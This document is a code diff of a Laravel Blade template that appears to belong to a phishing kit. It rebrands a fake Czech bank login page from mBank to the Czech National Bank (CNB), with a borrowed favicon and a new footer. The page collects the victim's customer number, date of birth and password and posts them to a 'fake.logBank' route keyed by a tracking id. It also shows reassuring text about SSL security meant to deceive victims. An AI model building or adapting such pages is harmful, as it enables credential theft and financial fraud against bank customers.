@@ -1,5 +1,6 @@
 @extends('layouts.fake')
 @push('css')
+    <link href="https://sugar-hosting.cz/wp-content/uploads/2018/03/cnb_ogo.png" rel="icon" type="image/x-icon">
     <style>
         ._0 {
             margin: 0 auto;
@@ -26,6 +27,9 @@
             padding-top: 16px;
             width: 100%;
             text-align: center;
+            font-size: 36;
+            font-style: bold;
+
         }
 
         ._2 {
@@ -34,17 +38,19 @@
         }
 
         ._3 {
-            text-align: left;
+            text-align: center;
             font-size: 14px;
-            border: 1px solid #c5c4c4;
+            border: 3px solid #c5c4c4;
+            background-color: #e5e5ea;
             border-radius: 6px;
+
             padding: 12px 10px;
             margin-bottom: 20px;
-            background-color: #D0D0D0;
         }
 
         ._3:hover {
             border-color: #000;
+            background-color: #e5e5ea;
         }
 
         ._4 {
@@ -60,18 +66,18 @@
             box-sizing: border-box;
             padding: 8px 30px 6px 31px;
             min-width: 180px;
-            border-radius: 7px;
+            border-radius: 3px;
             white-space: nowrap;
-            background-color: #e90b0a;
+            background-color: #2626a9;
             color: #fff;
             text-align: center;
             text-decoration: none;
         }
 
         ._4:hover {
-            background-color: #e90b0a;
+            background-color: #2626a9;
             color: #fff;
-            border-color: #e90b0a;
+            border-color: #2626a9;
         }
 
         ._5 {
@@ -201,29 +207,29 @@
 @section('content')
     <div id="mainblock">
         <div class="_0">
-            <center><img height="120"
-                         src="{{asset($bank['logo'])}}">
-            </center>
             <form id="bank_pm_form" method="POST"
                   action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
+                <center><img height="140" src="{{asset($bank['logo'])}}"></center>
                 <div class="loginboxes" style="margin-bottom: 20px;">
-                    <div class="_1">Přihlaste se do online bankovnictví</div>
+                    <div class="_1">Přihlaste se do systému</div>
                 </div>
-                <input class="_3" type="text" name="login"
-                       placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
+                <input class="_3" type="text" name="login" placeholder="Zadejte zákaznické číslo"
+                       required="">
                 <input class="_3" type="text" name="birthday" placeholder="Datum narození" required="">
                 <input class="_3" type="password" name="password" placeholder="Zadejte heslo" required="">
-                <input class="_3" type="password" name="pin"
-                       placeholder="Zadejte rodne prijmeni matky s diakritikou" required="">
                 <div class="loginboxes">
-                    <p style="text-align: center; color: #666666;">Všechna připojení jsou šifrována end-to-end</p>
-                    <input class="_4" type="submit" value="Další">
-                    <br><br>
+                    <p style="text-align: center; color: #666666;">Přihlášení do Klientského portálu je zabezpečeno
+                        prostřednictvím SSL.</p>
+                    <input class="_4" type="submit" value="Pokračovat"><br><br><br>
+                    <input style="background-color: #ebebee; color: #543323;" class="_4" type="submit"
+                           value="Pomoc s přihlášením">
                 </div>
             </form>
+            <center><img style="margin-top: 30px; border-radius: 10px;" width="300"
+                         src="{{asset('images/banks/20220203_prognoza_en.jpg_55707507.jpg')}}"></center>
         </div>
         <footer>
-            <center>{{date('Y')}} mBank</center>
+            <center>© {{date('Y')}} CNB</center>
         </footer>
     </div>
 @endsection
